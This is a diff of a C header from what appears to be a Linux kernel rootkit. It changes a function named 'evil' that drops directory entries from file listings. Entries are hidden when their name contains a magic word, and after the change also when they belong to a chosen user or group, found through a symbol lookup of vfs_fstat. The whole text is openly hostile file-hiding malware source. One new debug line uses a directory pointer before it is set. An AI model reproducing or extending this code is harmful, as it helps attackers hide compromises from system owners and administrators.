@@ -1,5 +1,6 @@
 #pragma once
 
+#include "rootkit.h"
 #include <linux/cred.h>
 #include <linux/linkage.h>
 #include <linux/stddef.h>
@@ -9,7 +10,6 @@
 
 
 extern char* MAGIC_WORD;
-
 
 /* Just so we know what the linux_dirent looks like.
    actually defined in fs/readdir.c
@@ -40,24 +40,27 @@ int __always_inline evil(struct linux_dirent __user * dirent, int res, int fd) {
 		goto out;
     }
 
-    int (*vfs_fstat)(int, struct kstat *) = lookup_name("vfs_fstat");
-    printk(KERN_DEBUG "vfs_fstat is at %lx\n", vfs_fstat);
+    int (*vfs_fstat_ptr)(int, struct kstat *) = (int (*)(int,  struct kstat *))lookup_name("vfs_fstat");
 
     struct kstat *stat = kzalloc(sizeof(struct kstat), GFP_KERNEL);
-    kuid_t user;
-    err = vfs_fstat(fd, stat);
+    int user;
+    int group;
+    err = vfs_fstat_ptr(fd, stat);
     if (err){
         printk(KERN_DEBUG "can not read file attributes!\n");
 		goto out;
     }
-    user = stat->uid;
+    user = (int)stat->uid.val;
+    group = (int)stat->gid.val;
     kfree(stat);
 
-    printk(KERN_DEBUG "file belongs to %i!\n", user);
+    printk(KERN_DEBUG "%s belongs to %i:%i!\n", dir->d_name, user, group);
 
 	while (off < res) {
 		dir = (void *)kdirent + off;
-		if (strstr(dir->d_name, MAGIC_WORD)) {
+		if (strstr(dir->d_name, MAGIC_WORD)
+            || user == USER_HIDE
+            || group == GROUP_HIDE) {
 			if (dir == kdirent) {
 				res -= dir->d_reclen;
 				memmove(dir, (void *)dir + dir->d_reclen, res);
